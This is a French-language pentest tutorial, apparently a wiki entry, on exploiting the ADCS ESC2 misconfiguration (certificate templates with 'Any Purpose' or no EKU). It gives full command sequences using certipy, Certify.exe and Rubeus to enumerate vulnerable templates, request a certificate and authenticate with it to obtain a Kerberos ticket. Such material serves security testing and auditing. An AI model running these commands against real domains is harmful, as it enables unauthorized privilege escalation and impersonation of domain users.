### Description

ESC2 exploite des modèles de certificats configurés avec l'Extended Key Usage (EKU) "Any Purpose" ou sans EKU défini, permettant d'utiliser le certificat pour n'importe quel usage, y compris l'authentification.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC2 si :

1. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
2. **EKU Any Purpose ou aucun EKU** - Une des conditions suivantes :
    - Le modèle a l'EKU `Any Purpose` (OID: 2.5.29.37.0)
    - Le modèle n'a aucun EKU défini
3. **Pas de signatures requises** - `CT_FLAG_PEND_ALL_REQUESTS` n'est pas activé

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse 
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des modèles Any Purpose
certipy find -u user@domain.local -p password -target dc01.domain.local | grep -i "any purpose\|no eku"
```

Faire la demande de certificat :

```bash
# Demande d'un certificat avec modèle Any Purpose
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'AnyPurposeTemplate'
```

Authentification avec le certificat reçu :

```bash
# Utilisation du certificat pour l'authentification client
certipy auth -pfx user.pfx -username user -domain domain.local -dc-ip 192.168.1.10

# Avec un mot de passe pour le certificat 
certipy auth -pfx user.pfx -password cert_password -username user -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC2
Certify.exe find /vulnerable | findstr "Any Purpose"
```

Faire la demande de certificat :

```powershell
# Demande d'un certificat avec le modèle vulnérable
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:AnyPurposeTemplate
```

Authentification avec le certificat reçu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:currentuser /certificate:cert.pfx /password:password123 /ptt
```

